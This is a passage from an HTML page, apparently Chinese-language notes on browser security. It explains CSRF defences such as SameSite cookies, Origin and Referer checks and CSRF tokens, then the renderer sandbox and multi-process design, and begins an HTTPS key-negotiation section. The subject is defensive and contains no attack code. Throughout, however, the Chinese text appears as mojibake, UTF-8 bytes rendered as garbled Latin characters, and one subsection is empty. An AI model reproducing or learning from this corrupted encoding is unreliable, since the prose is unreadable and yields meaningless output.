class="headerlink" title="1. å……åˆ†åˆ©ç”¨å¥½ Cookie çš„ SameSite å±æ€§"></a>1. å……åˆ†åˆ©ç”¨å¥½ Cookie çš„ SameSite å±æ€§</h4><p>Cookie æ˜¯æµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¹‹é—´ç»´æŠ¤ç™»å½•çŠ¶æ€çš„ä¸€ä¸ªå…³é”®æ•°æ®ã€‚é€šå¸¸ CSRF æ”»å‡»éƒ½æ˜¯ä»ç¬¬ä¸‰æ–¹ç«™ç‚¹å‘èµ·çš„ï¼Œè¦é˜²æ­¢ CSRF æ”»å‡»ï¼Œæˆ‘ä»¬æœ€å¥½èƒ½å®ç°ä»ç¬¬ä¸‰æ–¹ ç«™ç‚¹å‘é€è¯·æ±‚æ—¶ç¦æ­¢ Cookie çš„å‘é€ï¼Œå› æ­¤åœ¨æµè§ˆå™¨é€šè¿‡ä¸åŒæ¥æºå‘é€ HTTP è¯·æ±‚æ—¶ï¼Œæœ‰ å¦‚ä¸‹åŒºåˆ«ï¼š</p><ul><li>å¦‚æœæ˜¯ä»ç¬¬ä¸‰æ–¹ç«™ç‚¹å‘èµ·çš„è¯·æ±‚ï¼Œé‚£ä¹ˆéœ€è¦æµè§ˆå™¨ç¦æ­¢å‘é€æŸäº›å…³é”® Cookie æ•°æ®åˆ°æœ åŠ¡å™¨ï¼›</li><li>å¦‚æœæ˜¯åŒä¸€ä¸ªç«™ç‚¹å‘èµ·çš„è¯·æ±‚ï¼Œé‚£ä¹ˆå°±éœ€è¦ä¿è¯ Cookie æ•°æ®æ­£å¸¸å‘é€ã€‚</li></ul><p>åœ¨ HTTP å“åº”å¤´ä¸­ï¼Œé€šè¿‡ set-cookie å­—æ®µè®¾ç½® Cookie æ—¶ï¼Œå¯ä»¥å¸¦ä¸Š SameSite é€‰é¡¹ã€‚</p><p><strong>SameSite é€‰é¡¹é€šå¸¸æœ‰ Strictã€Lax å’Œ None ä¸‰ä¸ªå€¼ã€‚</strong></p><ul><li>Strict æœ€ä¸ºä¸¥æ ¼ã€‚å¦‚æœ SameSite çš„å€¼æ˜¯ Strictï¼Œé‚£ä¹ˆæµè§ˆå™¨ä¼šå®Œå…¨ç¦æ­¢ç¬¬ä¸‰æ–¹ Cookieã€‚ç®€è¨€ä¹‹ï¼Œå¦‚æœä½ ä»æå®¢æ—¶é—´çš„é¡µé¢ä¸­è®¿é—® InfoQ çš„èµ„æºï¼Œè€Œ InfoQ çš„æŸäº› Cookie è®¾ç½®äº† SameSite = Strict çš„è¯ï¼Œé‚£ä¹ˆè¿™äº› Cookie æ˜¯ä¸ä¼šè¢«å‘é€åˆ° InfoQ çš„æœ åŠ¡å™¨ä¸Šçš„ã€‚åªæœ‰ä½ ä» InfoQ çš„ç«™ç‚¹å»è¯·æ±‚ InfoQ çš„èµ„æºæ—¶ï¼Œæ‰ä¼šå¸¦ä¸Šè¿™äº› Cookieã€‚ </li><li>Lax ç›¸å¯¹å®½æ¾ä¸€ç‚¹ã€‚åœ¨è·¨ç«™ç‚¹çš„æƒ…å†µä¸‹ï¼Œä»ç¬¬ä¸‰æ–¹ç«™ç‚¹çš„é“¾æ¥æ‰“å¼€å’Œä»ç¬¬ä¸‰æ–¹ç«™ç‚¹æäº¤ Get æ–¹å¼çš„è¡¨å•è¿™ä¸¤ç§æ–¹å¼éƒ½ä¼šæºå¸¦ Cookieã€‚ä½†å¦‚æœåœ¨ç¬¬ä¸‰æ–¹ç«™ç‚¹ä¸­ä½¿ç”¨ Post æ–¹æ³•ï¼Œ æˆ–è€…é€šè¿‡ imgã€iframe ç­‰æ ‡ç­¾åŠ è½½çš„ URLï¼Œè¿™äº›åœºæ™¯éƒ½ä¸ä¼šæºå¸¦ Cookieã€‚ </li><li>è€Œå¦‚æœä½¿ç”¨ None çš„è¯ï¼Œåœ¨ä»»ä½•æƒ…å†µä¸‹éƒ½ä¼šå‘é€ Cookie æ•°æ®ã€‚</li></ul><p>å¯¹äºé˜²èŒƒ CSRF æ”»å‡»ï¼Œæˆ‘ä»¬å¯ä»¥é’ˆå¯¹å®é™…æƒ…å†µå°†ä¸€äº›å…³é”®çš„ Cookie è®¾ç½®ä¸º Strict æˆ–è€… Lax æ¨¡å¼ï¼Œè¿™æ ·åœ¨è·¨ç«™ç‚¹è¯·æ±‚æ—¶ï¼Œè¿™äº›å…³é”®çš„ Cookie å°±ä¸ä¼šè¢«å‘é€åˆ°æœåŠ¡å™¨ï¼Œä»è€Œä½¿å¾—é»‘å®¢çš„ CSRF æ”»å‡»å¤±æ•ˆã€‚</p><h4 id="2-éªŒè¯è¯·æ±‚çš„æ¥æºç«™ç‚¹"><a href="#2-éªŒè¯è¯·æ±‚çš„æ¥æºç«™ç‚¹" class="headerlink" title="2. éªŒè¯è¯·æ±‚çš„æ¥æºç«™ç‚¹"></a>2. éªŒè¯è¯·æ±‚çš„æ¥æºç«™ç‚¹</h4><p>åœ¨æœåŠ¡å™¨ç«¯éªŒè¯è¯·æ±‚æ¥æºçš„ç«™ç‚¹ã€‚ç”±äº CSRF æ”»å‡»å¤§å¤šæ¥è‡ªäºç¬¬ä¸‰æ–¹ç«™ç‚¹ï¼Œå› æ­¤æœåŠ¡å™¨å¯ä»¥ç¦æ­¢æ¥è‡ªç¬¬ä¸‰æ–¹ç«™ç‚¹çš„è¯· æ±‚ã€‚</p><p>HTTP è¯·æ±‚å¤´ä¸­çš„ Referer å’Œ Origin å±æ€§ï¼š</p><ul><li>Referer æ˜¯ HTTP è¯·æ±‚å¤´ä¸­çš„ä¸€ä¸ªå­—æ®µï¼Œè®°å½•äº†è¯¥ HTTP è¯·æ±‚çš„æ¥æºåœ°å€ã€‚æ¯”å¦‚ä»æå®¢æ—¶é—´çš„å®˜ç½‘æ‰“å¼€äº† InfoQ çš„ç«™ç‚¹ï¼Œé‚£ä¹ˆè¯·æ±‚å¤´ä¸­çš„ Referer å€¼æ˜¯æå®¢æ—¶é—´çš„ URLã€‚è™½ç„¶å¯ä»¥é€šè¿‡ Referer å‘Šè¯‰æœåŠ¡å™¨ HTTP è¯·æ±‚çš„æ¥æºï¼Œä½†æ˜¯æœ‰ä¸€äº›åœºæ™¯æ˜¯ä¸é€‚åˆå°†æ¥æº URL æš´éœ²ç»™æœåŠ¡å™¨çš„ï¼Œå› æ­¤æµè§ˆå™¨æä¾›ç»™å¼€å‘è€…ä¸€ä¸ªé€‰é¡¹ï¼Œå¯ä»¥ä¸ç”¨ä¸Šä¼  Referer å€¼ã€‚</li><li>ä½†åœ¨æœåŠ¡å™¨ç«¯éªŒè¯è¯·æ±‚å¤´ä¸­çš„ Referer å¹¶ä¸æ˜¯å¤ªå¯é ï¼Œå› æ­¤æ ‡å‡†å§”å‘˜ä¼šåˆåˆ¶å®šäº†Origin å± æ€§ï¼Œåœ¨ä¸€äº›é‡è¦çš„åœºåˆï¼Œæ¯”å¦‚é€šè¿‡ XMLHttpRequestã€Fecth å‘èµ·è·¨ç«™è¯·æ±‚æˆ–è€…é€šè¿‡ Post æ–¹æ³•å‘é€è¯·æ±‚æ—¶ï¼Œéƒ½ä¼šå¸¦ä¸Š Origin å±æ€§ã€‚</li></ul><p>Origin å±æ€§åªåŒ…å«äº†åŸŸåä¿¡æ¯ï¼Œå¹¶æ²¡æœ‰åŒ…å«å…·ä½“çš„ URL è·¯å¾„ï¼Œè¿™æ˜¯ Origin å’Œ Referer çš„ä¸€ä¸ªä¸»è¦åŒºåˆ«ã€‚å› æ­¤ï¼ŒæœåŠ¡å™¨çš„ç­–ç•¥æ˜¯ä¼˜å…ˆåˆ¤æ–­ Originï¼Œå¦‚æœè¯·æ±‚å¤´ä¸­æ²¡æœ‰åŒ…å« Origin å±æ€§ï¼Œå†æ ¹æ®å®é™…æƒ…å†µåˆ¤æ–­æ˜¯å¦ä½¿ç”¨ Referer å€¼ã€‚</p><h4 id="3-CSRF-Token"><a href="#3-CSRF-Token" class="headerlink" title="3. CSRF Token"></a>3. CSRF Token</h4><p>ç¬¬ä¸€æ­¥ï¼Œåœ¨æµè§ˆå™¨å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ç”Ÿæˆä¸€ä¸ª CSRF Tokenã€‚CSRF Token å…¶å®å°±æ˜¯æœåŠ¡å™¨ç”Ÿæˆçš„å­—ç¬¦ä¸²ï¼Œç„¶åå°†è¯¥å­—ç¬¦ä¸²æ¤å…¥åˆ°è¿”å›çš„é¡µé¢ä¸­ã€‚</p><p>ç¬¬äºŒæ­¥ï¼Œåœ¨æµè§ˆå™¨ç«¯å¦‚æœè¦å‘èµ·è½¬è´¦çš„è¯·æ±‚ï¼Œé‚£ä¹ˆéœ€è¦å¸¦ä¸Šé¡µé¢ä¸­çš„ CSRF Tokenï¼Œç„¶åæœ åŠ¡å™¨ä¼šéªŒè¯è¯¥ Token æ˜¯å¦åˆæ³•ã€‚å¦‚æœæ˜¯ä»ç¬¬ä¸‰æ–¹ç«™ç‚¹å‘å‡ºçš„è¯·æ±‚ï¼Œé‚£ä¹ˆå°†æ— æ³•è·å–åˆ° CSRF Token çš„å€¼ï¼Œæ‰€ä»¥å³ä½¿å‘å‡ºäº†è¯·æ±‚ï¼ŒæœåŠ¡å™¨ä¹Ÿä¼šå› ä¸º CSRF Token ä¸æ­£ç¡®è€Œæ‹’ç»è¯·æ±‚ã€‚</p><h2 id="å®‰å…¨æ²™ç®±ï¼šé¡µé¢å’Œç³»ç»Ÿä¹‹é—´çš„éš”ç¦»å¢™"><a href="#å®‰å…¨æ²™ç®±ï¼šé¡µé¢å’Œç³»ç»Ÿä¹‹é—´çš„éš”ç¦»å¢™" class="headerlink" title="å®‰å…¨æ²™ç®±ï¼šé¡µé¢å’Œç³»ç»Ÿä¹‹é—´çš„éš”ç¦»å¢™"></a>å®‰å…¨æ²™ç®±ï¼šé¡µé¢å’Œç³»ç»Ÿä¹‹é—´çš„éš”ç¦»å¢™</h2><p>æµè§ˆå™¨æœ¬èº«çš„æ¼æ´æ˜¯å•è¿›ç¨‹æµè§ˆå™¨çš„ä¸€ä¸ªä¸»è¦é—®é¢˜ï¼Œå¦‚æœæµè§ˆå™¨è¢«æ›å‡ºå­˜åœ¨æ¼æ´ï¼Œé‚£ä¹ˆåœ¨è¿™äº›æ¼æ´æ²¡æœ‰è¢«åŠæ—¶ä¿®å¤çš„æƒ…å†µä¸‹ï¼Œé»‘å®¢å°±æœ‰å¯èƒ½é€šè¿‡æ¶æ„çš„é¡µé¢å‘æµè§ˆå™¨ä¸­æ³¨å…¥æ¶æ„ç¨‹åºï¼Œå…¶ä¸­æœ€å¸¸è§çš„æ”»å‡»æ–¹å¼æ˜¯åˆ©ç”¨<strong>ç¼“å†²åŒºæº¢å‡º</strong>ï¼Œä¸è¿‡éœ€è¦<strong>æ³¨æ„è¿™ç§ç±»å‹çš„æ”»å‡»å’Œ XSS æ³¨å…¥çš„è„šæœ¬æ˜¯ä¸ä¸€æ ·çš„ã€‚</strong></p><ul><li>XSS æ”»å‡»åªæ˜¯å°†æ¶æ„çš„ JavaScript è„šæœ¬æ³¨å…¥åˆ°é¡µé¢ä¸­ï¼Œè™½ç„¶èƒ½çªƒå–ä¸€äº› Cookie ç›¸å…³çš„æ•°æ®ï¼Œä½†æ˜¯ XSS æ— æ³•å¯¹æ“ä½œç³»ç»Ÿè¿›è¡Œæ”»å‡»ã€‚</li><li>è€Œé€šè¿‡æµè§ˆå™¨æ¼æ´è¿›è¡Œçš„æ”»å‡»æ˜¯å¯ä»¥å…¥ä¾µåˆ°æµè§ˆå™¨è¿›ç¨‹å†…éƒ¨çš„ï¼Œå¯ä»¥è¯»å–å’Œä¿®æ”¹æµè§ˆå™¨è¿›ç¨‹å†…éƒ¨çš„ä»»æ„å†…å®¹ï¼Œè¿˜å¯ä»¥ç©¿é€æµè§ˆå™¨ï¼Œåœ¨ç”¨æˆ·çš„æ“ä½œç³»ç»Ÿä¸Šæ‚„æ‚„åœ°å®‰è£…æ¶æ„è½¯ä»¶ã€ç›‘å¬ç”¨æˆ·é”®ç›˜è¾“å…¥ä¿¡æ¯ä»¥åŠè¯»å–ç”¨æˆ·ç¡¬ç›˜ä¸Šçš„æ–‡ä»¶å†…å®¹ã€‚</li></ul><h3 id="å®‰å…¨è§†è§’ä¸‹çš„å¤šè¿›ç¨‹æ¶æ„"><a href="#å®‰å…¨è§†è§’ä¸‹çš„å¤šè¿›ç¨‹æ¶æ„" class="headerlink" title="å®‰å…¨è§†è§’ä¸‹çš„å¤šè¿›ç¨‹æ¶æ„"></a>å®‰å…¨è§†è§’ä¸‹çš„å¤šè¿›ç¨‹æ¶æ„</h3><p><img src="https://i.loli.net/2021/06/15/t5YT2AHZoVwfaWn.jpg" alt="Snipaste_2021-06-15_16-25-16.jpg"></p><p>æˆ‘ä»¬çŸ¥é“æµè§ˆå™¨è¢«åˆ’åˆ†ä¸ºæµè§ˆå™¨å†…æ ¸å’Œæ¸²æŸ“å†…æ ¸ä¸¤ä¸ªæ ¸å¿ƒæ¨¡å—ï¼Œå…¶ä¸­æµè§ˆå™¨å†…æ ¸æ˜¯ç”±ç½‘ç»œè¿›ç¨‹ã€æµè§ˆå™¨ä¸»è¿›ç¨‹å’Œ GPU è¿›ç¨‹ç»„æˆçš„ï¼Œæ¸²æŸ“å†…æ ¸å°±æ˜¯æ¸²æŸ“è¿›ç¨‹ã€‚é‚£å¦‚æœæˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ä¸€ä¸ªé¡µé¢ï¼Œè¿™ä¸¤ä¸ªæ¨¡å—æ˜¯æ€ä¹ˆé…åˆçš„å‘¢ï¼Ÿ</p><p>æ‰€æœ‰çš„ç½‘ç»œèµ„æºéƒ½æ˜¯é€šè¿‡æµè§ˆå™¨å†…æ ¸æ¥ä¸‹è½½çš„ï¼Œä¸‹è½½åçš„èµ„æºä¼šé€šè¿‡ IPC å°†å…¶æäº¤ç»™æ¸²æŸ“è¿›ç¨‹ï¼ˆæµè§ˆå™¨å†…æ ¸å’Œæ¸²æŸ“è¿›ç¨‹ä¹‹é—´éƒ½æ˜¯é€šè¿‡ IPC æ¥é€šä¿¡çš„ï¼‰ã€‚ç„¶åæ¸²æŸ“è¿›ç¨‹ä¼šå¯¹è¿™äº›èµ„æºè¿›è¡Œè§£æã€ç»˜åˆ¶ç­‰æ“ä½œï¼Œæœ€ç»ˆç”Ÿæˆä¸€å¹…å›¾ç‰‡ã€‚ä½†æ˜¯æ¸²æŸ“è¿›ç¨‹å¹¶ä¸è´Ÿè´£å°†å›¾ç‰‡æ˜¾ç¤ºåˆ°ç•Œé¢ä¸Šï¼Œè€Œæ˜¯å°†æœ€ç»ˆç”Ÿæˆçš„å›¾ç‰‡æäº¤ç»™æµè§ˆå™¨å†…æ ¸æ¨¡å—ï¼Œç”±æµè§ˆå™¨å†…æ ¸æ¨¡å—è´Ÿè´£æ˜¾ç¤ºè¿™å¼ å›¾ç‰‡ã€‚</p><h3 id="å®‰å…¨æ²™ç®±"><a href="#å®‰å…¨æ²™ç®±" class="headerlink" title="å®‰å…¨æ²™ç®±"></a>å®‰å…¨æ²™ç®±</h3><p>æµè§ˆå™¨å¯ä»¥å®‰å…¨åœ°ä¸‹è½½å„ç§ç½‘ç»œèµ„æºï¼Œä½†æ˜¯å¦‚æœè¦æ‰§è¡Œè¿™äº›ç½‘ç»œèµ„æºï¼Œæ¯”å¦‚è§£æ HTMLã€è§£æ CSSã€æ‰§è¡Œ JavaScriptã€å›¾ç‰‡ç¼–è§£ç ç­‰æ“ä½œï¼Œå°±éœ€è¦éå¸¸è°¨æ…äº†ï¼Œå› ä¸ºä¸€ä¸å°å¿ƒï¼Œé»‘å®¢å°±ä¼šåˆ©ç”¨è¿™äº›æ“ä½œå¯¹å«æœ‰æ¼æ´çš„æµè§ˆå™¨å‘èµ·æ”»å‡»ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨æ¸²æŸ“è¿›ç¨‹å’Œæ“ä½œç³»ç»Ÿä¹‹é—´å»ºä¸€é“å¢™ï¼Œå³ä¾¿æ¸²æŸ“è¿›ç¨‹ç”±äºå­˜åœ¨æ¼æ´è¢«é»‘å®¢æ”»å‡»ï¼Œä½†ç”±äºè¿™é“å¢™ï¼Œé»‘å®¢å°±è·å–ä¸åˆ°æ¸²æŸ“è¿›ç¨‹ä¹‹å¤–çš„ä»»ä½•æ“ä½œæƒé™ã€‚<strong>å°†æ¸²æŸ“è¿›ç¨‹å’Œæ“ä½œç³»ç»Ÿéš”ç¦»çš„è¿™é“å¢™å°±æ˜¯æˆ‘ä»¬è¦èŠçš„å®‰å…¨æ²™ç®±ã€‚</strong></p><p>æµè§ˆå™¨ä¸­çš„å®‰å…¨æ²™ç®±æ˜¯åˆ©ç”¨æ“ä½œç³»ç»Ÿæä¾›çš„å®‰å…¨æŠ€æœ¯ï¼Œè®©æ¸²æŸ“è¿›ç¨‹åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­æ— æ³•è®¿é—®æˆ–è€…ä¿®æ”¹æ“ä½œç³»ç»Ÿä¸­çš„æ•°æ®ï¼Œåœ¨æ¸²æŸ“è¿›ç¨‹éœ€è¦è®¿é—®ç³»ç»Ÿèµ„æºçš„æ—¶å€™ï¼Œéœ€è¦é€šè¿‡æµè§ˆå™¨å†…æ ¸æ¥å®ç°ï¼Œç„¶åå°†è®¿é—®çš„ç»“æœé€šè¿‡ IPC è½¬å‘ç»™æ¸²æŸ“è¿›ç¨‹ã€‚</p><p>å®‰å…¨æ²™ç®±æœ€å°çš„ä¿æŠ¤å•ä½æ˜¯è¿›ç¨‹ã€‚å› ä¸ºå•è¿›ç¨‹æµè§ˆå™¨éœ€è¦é¢‘ç¹è®¿é—®æˆ–è€…ä¿®æ”¹æ“ä½œç³»ç»Ÿçš„æ•°æ®ï¼Œæ‰€ä»¥å•è¿›ç¨‹æµè§ˆå™¨æ˜¯æ— æ³•è¢«å®‰å…¨æ²™ç®±ä¿æŠ¤çš„ï¼Œè€Œç°ä»£æµè§ˆå™¨é‡‡ç”¨çš„å¤šè¿›ç¨‹æ¶æ„ä½¿å¾—å®‰å…¨æ²™ç®±å¯ä»¥å‘æŒ¥ä½œç”¨ã€‚</p><h3 id="å®‰å…¨æ²™ç®±å¦‚ä½•å½±å“å„ä¸ªæ¨¡å—åŠŸèƒ½"><a href="#å®‰å…¨æ²™ç®±å¦‚ä½•å½±å“å„ä¸ªæ¨¡å—åŠŸèƒ½" class="headerlink" title="å®‰å…¨æ²™ç®±å¦‚ä½•å½±å“å„ä¸ªæ¨¡å—åŠŸèƒ½"></a>å®‰å…¨æ²™ç®±å¦‚ä½•å½±å“å„ä¸ªæ¨¡å—åŠŸèƒ½</h3><p><img src="https://i.loli.net/2021/06/15/G5OdEmhKgB8l79F.jpg" alt="Snipaste_2021-06-15_16-28-39.jpg"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç”±äºæ¸²æŸ“è¿›ç¨‹éœ€è¦å®‰å…¨æ²™ç®±çš„ä¿æŠ¤ï¼Œå› æ­¤éœ€è¦æŠŠåœ¨æ¸²æŸ“è¿›ç¨‹å†…éƒ¨æ¶‰åŠåˆ°å’Œç³»ç»Ÿäº¤äº’çš„åŠŸèƒ½éƒ½è½¬ç§»åˆ°æµè§ˆå™¨å†…æ ¸ä¸­å»å®ç°ã€‚</p><h4 id="1-æŒä¹…å­˜å‚¨"><a href="#1-æŒä¹…å­˜å‚¨" class="headerlink" title="1. æŒä¹…å­˜å‚¨"></a>1. æŒä¹…å­˜å‚¨</h4><p>æ–‡ä»¶å†…å®¹çš„è¯»å†™éƒ½æ˜¯åœ¨æµè§ˆå™¨å†…æ ¸ä¸­å®Œæˆçš„ï¼š</p><ul><li>å­˜å‚¨ Cookie æ•°æ®çš„è¯»å†™ã€‚é€šå¸¸æµè§ˆå™¨å†…æ ¸ä¼šç»´æŠ¤ä¸€ä¸ªå­˜æ”¾æ‰€æœ‰ Cookie çš„ Cookie æ•°æ®åº“ï¼Œç„¶åå½“æ¸²æŸ“è¿›ç¨‹é€šè¿‡ JavaScript æ¥è¯»å– Cookie æ—¶ï¼Œæ¸²æŸ“è¿›ç¨‹ä¼šé€šè¿‡ IPC å°†è¯»å– Cookie çš„ä¿¡æ¯å‘é€ç»™æµè§ˆå™¨å†…æ ¸ï¼Œæµè§ˆå™¨å†…æ ¸è¯»å– Cookie ä¹‹åå†å°†å†…å®¹è¿”å›ç»™æ¸²æŸ“è¿›ç¨‹ã€‚</li><li>ä¸€äº›ç¼“å­˜æ–‡ä»¶çš„è¯»å†™ä¹Ÿæ˜¯ç”±æµè§ˆå™¨å†…æ ¸å®ç°çš„ï¼Œæ¯”å¦‚ç½‘ç»œæ–‡ä»¶ç¼“å­˜çš„è¯»å–ã€‚</li></ul><h4 id="2-ç½‘ç»œè®¿é—®"><a href="#2-ç½‘ç»œè®¿é—®" class="headerlink" title="2. ç½‘ç»œè®¿é—®"></a>2. ç½‘ç»œè®¿é—®</h4><p>åŒæ ·æœ‰äº†å®‰å…¨æ²™ç®±çš„ä¿æŠ¤ï¼Œåœ¨æ¸²æŸ“è¿›ç¨‹å†…éƒ¨ä¹Ÿæ˜¯ä¸èƒ½ç›´æ¥è®¿é—®ç½‘ç»œçš„ï¼Œå¦‚æœè¦è®¿é—®ç½‘ç»œï¼Œåˆ™éœ€è¦é€šè¿‡æµè§ˆå™¨å†…æ ¸ã€‚ä¸è¿‡æµè§ˆå™¨å†…æ ¸åœ¨å¤„ç† URL è¯·æ±‚ä¹‹å‰ï¼Œä¼šæ£€æŸ¥æ¸²æŸ“è¿›ç¨‹æ˜¯å¦æœ‰æƒé™è¯·æ±‚è¯¥ URLï¼Œæ¯”å¦‚æ£€æŸ¥ XMLHttpRequest æˆ–è€… Fetch æ˜¯å¦æ˜¯è·¨ç«™ç‚¹è¯·æ±‚ï¼Œæˆ–è€…æ£€æµ‹ HTTPS çš„ç«™ç‚¹ä¸­æ˜¯å¦åŒ…å«äº† HTTP çš„è¯·æ±‚ã€‚</p><h4 id="3-ç”¨æˆ·äº¤äº’"><a href="#3-ç”¨æˆ·äº¤äº’" class="headerlink" title="3. ç”¨æˆ·äº¤äº’"></a>3. ç”¨æˆ·äº¤äº’</h4><h2 id="HTTPSï¼šè®©æ•°æ®ä¼ è¾“æ›´å®‰å…¨"><a href="#HTTPSï¼šè®©æ•°æ®ä¼ è¾“æ›´å®‰å…¨" class="headerlink" title="HTTPSï¼šè®©æ•°æ®ä¼ è¾“æ›´å®‰å…¨"></a>HTTPSï¼šè®©æ•°æ®ä¼ è¾“æ›´å®‰å…¨</h2><h3 id="åœ¨-HTTP-åè®®æ ˆä¸­å¼•å…¥å®‰å…¨å±‚"><a href="#åœ¨-HTTP-åè®®æ ˆä¸­å¼•å…¥å®‰å…¨å±‚" class="headerlink" title="åœ¨ HTTP åè®®æ ˆä¸­å¼•å…¥å®‰å…¨å±‚"></a>åœ¨ HTTP åè®®æ ˆä¸­å¼•å…¥å®‰å…¨å±‚</h3><p><img src="https://i.loli.net/2021/06/15/pPkjuvtW3bs6h45.jpg" alt="Snipaste_2021-06-15_16-35-08.jpg"></p><p>é€šå¸¸ HTTP ç›´æ¥å’Œ TCP é€šä¿¡ï¼ŒHTTPS åˆ™å…ˆå’Œå®‰å…¨å±‚é€šä¿¡ï¼Œç„¶åå®‰å…¨å±‚å†å’Œ TCP å±‚é€šä¿¡ã€‚ä¹Ÿå°±æ˜¯è¯´ HTTPS æ‰€æœ‰çš„å®‰å…¨æ ¸å¿ƒéƒ½åœ¨å®‰å…¨å±‚ï¼Œå®ƒä¸ä¼šå½±å“åˆ°ä¸Šé¢çš„ HTTP åè®®ï¼Œä¹Ÿä¸ä¼šå½±å“åˆ°ä¸‹é¢çš„ TCP/IPã€‚</p><p>æ€»çš„æ¥è¯´ï¼Œå®‰å…¨å±‚æœ‰ä¸¤ä¸ªä¸»è¦çš„èŒè´£ï¼š<strong>å¯¹å‘èµ· HTTP è¯·æ±‚çš„æ•°æ®è¿›è¡ŒåŠ å¯†æ“ä½œå’Œå¯¹æ¥æ”¶åˆ° HTTP çš„å†…å®¹è¿›è¡Œè§£å¯†æ“ä½œã€‚</strong></p><h4 id="ç¬¬ä¸€ç‰ˆï¼šä½¿ç”¨å¯¹ç§°åŠ å¯†"><a href="#ç¬¬ä¸€ç‰ˆï¼šä½¿ç”¨å¯¹ç§°åŠ å¯†" class="headerlink" title="ç¬¬ä¸€ç‰ˆï¼šä½¿ç”¨å¯¹ç§°åŠ å¯†"></a>ç¬¬ä¸€ç‰ˆï¼šä½¿ç”¨å¯¹ç§°åŠ å¯†</h4><p>å¯¹ç§°åŠ å¯†æ˜¯æŒ‡åŠ å¯†å’Œè§£å¯†éƒ½ä½¿ç”¨çš„æ˜¯ç›¸åŒçš„å¯†é’¥ã€‚å› æ­¤ï¼Œåœ¨ HTTPS å‘é€æ•°æ®ä¹‹å‰ï¼Œæµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¹‹é—´éœ€è¦åå•†åŠ å¯†æ–¹å¼å’Œå¯†é’¥ï¼Œè¿‡ç¨‹å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="https://i.loli.net/2021/06/15/EiBFkhUYQfmO3y2.jpg" alt="Snipaste_2021-06-15_16-37-12.jpg"></p><p>é€šè¿‡ä¸Šå›¾æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼ŒHTTPS é¦–å…ˆè¦åå•†åŠ è§£å¯†æ–¹å¼ï¼Œè¿™ä¸ªè¿‡ç¨‹å°±æ˜¯ HTTPS å»ºç«‹å®‰å…¨è¿æ¥çš„è¿‡ç¨‹ã€‚ä¸ºäº†è®©åŠ å¯†çš„å¯†é’¥æ›´åŠ éš¾ä»¥ç ´è§£ï¼Œæˆ‘ä»¬è®©æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯åŒæ—¶å†³å®šå¯†é’¥ï¼Œå…·ä½“è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li>æµè§ˆå™¨å‘é€å®ƒæ‰€æ”¯æŒçš„åŠ å¯†å¥—ä»¶åˆ—è¡¨å’Œä¸€ä¸ªéšæœºæ•° client-randomï¼Œè¿™é‡Œçš„åŠ å¯†å¥—ä»¶æ˜¯æŒ‡åŠ å¯†çš„æ–¹æ³•ï¼ŒåŠ å¯†å¥—ä»¶åˆ—è¡¨å°±æ˜¯æŒ‡æµè§ˆå™¨èƒ½æ”¯æŒå¤šå°‘ç§åŠ å¯†æ–¹æ³•åˆ—è¡¨ã€‚</li><li>æœåŠ¡å™¨ä¼šä»åŠ å¯†å¥—ä»¶åˆ—è¡¨ä¸­é€‰å–ä¸€ä¸ªåŠ å¯†å¥—ä»¶ï¼Œç„¶åè¿˜ä¼šç”Ÿæˆä¸€ä¸ªéšæœºæ•° service-randomï¼Œå¹¶å°† service-random å’ŒåŠ å¯†å¥—ä»¶åˆ—è¡¨è¿”å›ç»™æµè§ˆå™¨ã€‚</li><li>æœ€åæµè§ˆå™¨å’ŒæœåŠ¡å™¨åˆ†åˆ«è¿”å›ç¡®è®¤æ¶ˆæ¯ã€‚</li></ul><p>è¿™æ ·æµè§ˆå™¨ç«¯å’ŒæœåŠ¡å™¨ç«¯éƒ½æœ‰ç›¸åŒçš„ client-random å’Œ service-random äº†ï¼Œç„¶åå®ƒä»¬å†ä½¿ç”¨ç›¸åŒçš„æ–¹æ³•å°† client-random å’Œ service-random æ··åˆèµ·æ¥ç”Ÿæˆä¸€ä¸ªå¯†é’¥ master secretï¼Œæœ‰äº†å¯†é’¥ master secret å’ŒåŠ å¯†å¥—ä»¶ä¹‹åï¼ŒåŒæ–¹å°±å¯ä»¥è¿›è¡Œæ•°æ®çš„åŠ å¯†ä¼ è¾“äº†ã€‚</p><p>ä½†æ˜¯å…¶ä¸­ä¼ è¾“ client-random å’Œ service-random çš„è¿‡ç¨‹å´æ˜¯æ˜æ–‡çš„ï¼Œè¿™æ„å‘³ç€é»‘å®¢ä¹Ÿå¯ä»¥æ‹¿åˆ°åå•†çš„åŠ å¯†å¥—ä»¶å’ŒåŒæ–¹çš„éšæœºæ•°ï¼Œç”±äºåˆ©ç”¨éšæœºæ•°åˆæˆå¯†é’¥çš„ç®—æ³•æ˜¯å…¬å¼€çš„ï¼Œæ‰€ä»¥é»‘å®¢æ‹¿åˆ°éšæœºæ•°ä¹‹åï¼Œä¹Ÿå¯ä»¥åˆæˆå¯†é’¥ï¼Œè¿™æ ·æ•°æ®ä¾ç„¶å¯ä»¥è¢«ç ´è§£ï¼Œé‚£ä¹ˆé»‘å®¢ä¹Ÿå°±å¯ä»¥ä½¿ç”¨å¯†é’¥æ¥ä¼ªé€ æˆ–ç¯¡æ”¹æ•°æ®äº†ã€‚</p><h4 id="ç¬¬äºŒç‰ˆï¼šä½¿ç”¨éå¯¹ç§°åŠ å¯†"><a href="#ç¬¬äºŒç‰ˆï¼šä½¿ç”¨éå¯¹ç§°åŠ å¯†" class="headerlink" title="ç¬¬äºŒç‰ˆï¼šä½¿ç”¨éå¯¹ç§°åŠ å¯†"></a>ç¬¬äºŒç‰ˆï¼šä½¿ç”¨éå¯¹ç§°åŠ å¯†</h4><p>éå¯¹ç§°åŠ å¯†ç®—æ³•æœ‰ Aã€B ä¸¤æŠŠå¯†é’¥ï¼Œå¦‚æœä½ ç”¨ A å¯†é’¥æ¥åŠ å¯†ï¼Œé‚£ä¹ˆåªèƒ½ä½¿ç”¨ B å¯†é’¥æ¥è§£å¯†ï¼›åè¿‡æ¥ï¼Œå¦‚æœä½ è¦ B 